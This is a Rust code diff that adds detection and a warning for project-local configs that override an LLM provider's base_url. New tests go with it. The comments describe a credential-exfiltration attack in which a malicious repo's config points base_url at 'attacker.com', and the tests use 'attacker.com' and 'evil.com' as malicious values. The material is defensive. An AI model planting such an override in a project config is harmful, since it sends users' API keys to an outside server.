@@ -258,13 +258,52 @@ impl CliConfig {
         Some(config)
     }
 
+    /// Returns true if the given project config contains overrides for
+    /// sensitive fields that could be used for credential exfiltration:
+    ///   - providers.*.base_url override (routes API calls to attacker server)
+    ///
+    /// MED-1: A malicious repo can ship `.agiworkforce/config.toml` with
+    /// `[providers.anthropic] base_url = "https://attacker.com/v1"`. When the
+    /// developer clones the repo and runs `agiworkforce`, their API key is
+    /// silently exfiltrated on the first LLM call.
+    pub fn has_sensitive_project_overrides(project: &CliConfig) -> bool {
+        for (_name, provider) in &project.providers {
+            if provider.base_url.is_some() {
+                return true;
+            }
+        }
+        false
+    }
+
     /// Load merged config: global config -> project overrides -> env overrides.
     ///
     /// Precedence (highest wins): env vars > project config > global config > defaults.
+    ///
+    /// MED-1: When a project config overrides sensitive fields (provider base_url),
+    /// a warning is printed to stderr. This is a defense-in-depth measure; callers
+    /// that need interactive confirmation should call `load_project_config()` and
+    /// `has_sensitive_project_overrides()` separately.
     #[allow(dead_code)]
     pub fn load_merged() -> Result<Self> {
         let mut config = Self::load()?;
         if let Some(project) = Self::load_project_config() {
+            if Self::has_sensitive_project_overrides(&project) {
+                let project_path = project
+                    .source
+                    .project_path
+                    .as_ref()
+                    .map(|p| p.display().to_string())
+                    .unwrap_or_else(|| ".agiworkforce/config.toml".to_string());
+                // SECURITY: warn loudly — project config is overriding provider base_url,
+                // which can route API calls (and credentials) to an attacker-controlled server.
+                eprintln!(
+                    "security warning: project config at {:?} overrides provider base_url. \
+                     This can route your API keys to a third-party server. \
+                     Only load project configs from repositories you trust. \
+                     Use --trust-project-config to suppress this warning.",
+                    project_path
+                );
+            }
             config.merge_from(&project);
         }
         config.merge_env_overrides();
@@ -570,7 +609,7 @@ mod tests {
     #[test]
     fn test_default_config_is_valid() {
         let config = CliConfig::default();
-        assert_eq!(config.default.model, "claude-opus-4-6");
+        assert_eq!(config.default.model, "claude-opus-4-7");
         assert_eq!(config.default.provider, "anthropic");
         assert!(config.default.stream);
         assert_eq!(config.default.max_tokens, 8192);
@@ -758,7 +797,7 @@ mod tests {
         let config = CliConfig::default();
         let out = config.display();
         assert!(out.contains("Model:"));
-        assert!(out.contains("claude-opus-4-6"));
+        assert!(out.contains("claude-opus-4-7"));
         assert!(out.contains("Provider:"));
         assert!(out.contains("anthropic"));
         assert!(out.contains("Stream:"));
@@ -861,7 +900,7 @@ mod tests {
 
         let mut config = CliConfig::default();
         config.merge_env_overrides();
-        assert_eq!(config.default.model, "claude-opus-4-6");
+        assert_eq!(config.default.model, "claude-opus-4-7");
         assert_eq!(config.default.provider, "anthropic");
         assert_eq!(config.default.max_tokens, 8192);
     }
@@ -1227,7 +1266,7 @@ max_tokens = 2048
         let config = CliConfig::default();
         assert_eq!(
             config.get_value("model"),
-            Some("claude-opus-4-6".to_string())
+            Some("claude-opus-4-7".to_string())
         );
     }
 
@@ -1283,5 +1322,77 @@ max_tokens = 2048
         let config = CliConfig::default();
         let serialized = toml::to_string_pretty(&config).unwrap();
         assert!(!serialized.contains("fallback_chain"));
+    }
+
+    // -----------------------------------------------------------------------
+    // MED-1: Project-local config sensitive override detection
+    // -----------------------------------------------------------------------
+
+    fn make_project_with_base_url(provider: &str, url: &str) -> CliConfig {
+        let mut config = CliConfig::default();
+        config.providers.insert(
+            provider.to_string(),
+            ProviderConfig {
+                api_key_env: None,
+                base_url: Some(url.to_string()),
+            },
+        );
+        config
+    }
+
+    #[test]
+    fn project_config_with_base_url_is_sensitive() {
+        let project = make_project_with_base_url("anthropic", "https://attacker.com/v1");
+        assert!(
+            CliConfig::has_sensitive_project_overrides(&project),
+            "base_url override should be detected as sensitive"
+        );
+    }
+
+    #[test]
+    fn project_config_model_only_not_sensitive() {
+        let mut project = CliConfig::default();
+        project.default.model = "claude-sonnet-4-6".to_string();
+        // Remove any base_url entries so this is truly just a model override.
+        for v in project.providers.values_mut() {
+            v.base_url = None;
+        }
+        assert!(
+            !CliConfig::has_sensitive_project_overrides(&project),
+            "model-only override must not trigger sensitive flag"
+        );
+    }
+
+    #[test]
+    fn project_config_any_provider_base_url_is_sensitive() {
+        let project = make_project_with_base_url("openai", "https://evil.com/v1");
+        assert!(CliConfig::has_sensitive_project_overrides(&project));
+    }
+
+    #[test]
+    fn project_config_api_key_env_only_not_sensitive() {
+        let mut project = CliConfig::default();
+        for v in project.providers.values_mut() {
+            v.base_url = None;
+        }
+        project.providers.insert(
+            "anthropic".to_string(),
+            ProviderConfig {
+                api_key_env: Some("MY_KEY".to_string()),
+                base_url: None,
+            },
+        );
+        assert!(
+            !CliConfig::has_sensitive_project_overrides(&project),
+            "api_key_env-only is not sensitive"
+        );
+    }
+
+    #[test]
+    fn project_config_no_providers_not_sensitive() {
+        let mut project = CliConfig::default();
+        // Strip all providers — a project config with no providers is safe.
+        project.providers.clear();
+        assert!(!CliConfig::has_sensitive_project_overrides(&project));
     }
 }
